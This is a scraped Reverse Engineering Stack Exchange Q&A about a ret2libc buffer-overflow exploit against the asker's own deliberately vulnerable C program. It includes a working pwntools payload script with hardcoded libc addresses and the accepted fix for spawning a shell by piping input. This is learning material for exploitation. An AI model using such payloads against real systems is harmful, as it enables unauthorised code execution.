{
    "title": "ret2libc: problem getting exploit work without pwntools",
    "link": "https://reverseengineering.stackexchange.com/questions/29089/ret2libc-problem-getting-exploit-work-without-pwntools",
    "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>I am trying to exploit this program <code>test</code> with ret2libc. Only NX is enabled.</p>\n<pre><code>#include &lt;stdio.h&gt;\n\nvoid vuln() {\n    char buffer[256];\n    gets(buffer);\n}\n\nint main() {\n    vuln();\n    return 0;\n}\n</code></pre>\n<p>I am able to exploit the program with pwntools, but I am unable to exploit it doing <code>./test &lt; myfile.txt</code>.</p>\n<p>Exploit:</p>\n<pre><code>#!/bin/python3\nfrom pwn import process, gdb, shellcraft, p32, asm\nfrom pwnlib.util.cyclic import cyclic, cyclic_find\nimport os\n\nLOCAL_BIN = \"./test\"\nSYSTEM_ADDR = 0xf7e10420 # p system\nSHELL_ADDR = 0xf7f5a352 # find &amp;system,+9999999,\"/bin/sh\"\nEXIT = 0xf7e02f80 # p exit\nOFFSET = 264 # offset to ebp\nP = process(LOCAL_BIN)\nG = gdb.attach(P.pid, \"b *0x080491c7\")\n\npayload = b''\npayload = payload.ljust(OFFSET, b'A')\npayload += b'BBBB' # fill ebp with \\x42\npayload += p32(SYSTEM_ADDR)\npayload += p32(EXIT)\npayload += p32(SHELL_ADDR)\n\n# write bytes to file. ./test &lt; myfile.txt should work the same?\nwith open('myfile.txt', 'wb') as w:\n    w.write(payload)\n\nP.sendline(payload)\nP.interactive()\nexit()\n</code></pre>\n<p>What is the difference from running pwntools and piping bytes into the program?</p>\n</div>",
    "votes": "0",
    "answers": 1,
    "views": "426",
    "tags": [
        "c",
        "buffer-overflow",
        "pwntools"
    ],
    "user": "Mr Krisey",
    "time": "Aug 3, 2021 at 1:50",
    "comments": [
        {
            "user": "Paweł Łukasik",
            "text": "<span class=\"comment-copy\">\"I am unable to exploit it doing <code>./test &lt; myfile.txt</code> - what's the effect of this not working?</span>",
            "time": null
        },
        {
            "user": "Mr Krisey",
            "text": "<span class=\"comment-copy\">I am not sure with what you mean with effects, but the program runs fine when I do it. No segfault or anything like that. I have even run both the programs side by side inside gdb. Look at this <a href=\"https://gyazo.com/e25632d05b9bed9a4fdf99fefde1e2b9\" rel=\"nofollow noreferrer\">gyazo.com/e25632d05b9bed9a4fdf99fefde1e2b9</a>. How can this fail? Eveything looks as it should...?</span>",
            "time": null
        },
        {
            "user": "Mr Krisey",
            "text": "<span class=\"comment-copy\">And since the program runs without fail (and that it enters the system function) I really can't see why it just runs <code>system</code> without giving a shell. It just runs without giving any output.</span>",
            "time": null
        }
    ],
    "answers_data": [
        {
            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>It seems that I made two critical mistakes when I tried to use <code>myfile.txt</code> to exploit the binary.</p>\n<ol>\n<li>When writing the exploit to the file I did NOT append <code>\\n</code> to the payload. <code>P.sendline()</code> appends this to the payload automatically. Without <code>\\n</code> the function <code>gets()</code> just keeps asking for more input.</li>\n<li>The second mistake was not to include the <code>stdin</code> when piping to <code>myfile.txt</code>. I am unsure about the specifics about this, but when running <code>cat myfile.txt - | ./test</code> I got the shell I wanted.</li>\n</ol>\n</div>",
            "votes": "1",
            "user": "Mr Krisey",
            "time": "Aug 4, 2021 at 8:47",
            "is_accepted": true,
            "comments": []
        }
    ]
}